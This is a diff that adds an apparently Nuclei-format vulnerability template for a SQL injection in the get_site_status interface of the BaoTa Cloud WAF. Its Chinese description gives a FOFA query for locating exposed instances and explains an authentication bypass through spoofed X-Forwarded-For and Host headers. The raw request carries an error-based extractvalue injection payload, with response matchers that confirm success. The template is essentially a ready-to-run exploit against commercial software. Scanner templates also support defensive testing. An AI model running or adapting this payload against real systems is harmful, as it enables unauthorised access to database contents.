@@ -1,0 +1,25 @@
+id: bt-waf-sqli
+
+info:
+  name: "堡塔云 WAF get_site_status 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title=="404 - Website not exist!"
+          堡塔云 WAF 是广东堡塔安全技术有限公司开发的Web应用防护系统。该产品在处理 get_site_status 接口的 server_name 参数时存在SQL注入缺陷，攻击者可通过该漏洞获取数据库中的敏感数据。漏洞触发点位于 /cloud_waf/nginx/conf.d/waf/public/waf_route.lua 脚本文件，当请求中包含特定构造的IP地址与域名组合时，可绕过身份验证机制直接访问管理API。通过将x-forwarded-for请求头设置为127.0.0.1、HOST头设置为127.0.0.251，即可满足漏洞利用条件实现未授权访问。
+  tags: 堡塔云 WAF
+
+http:
+- raw:
+  - |
+    GET /get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-' HTTP/1.1
+    Host: {{Hostname}}
+    X-Forwarded-For: 127.0.0.1
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'syntax'
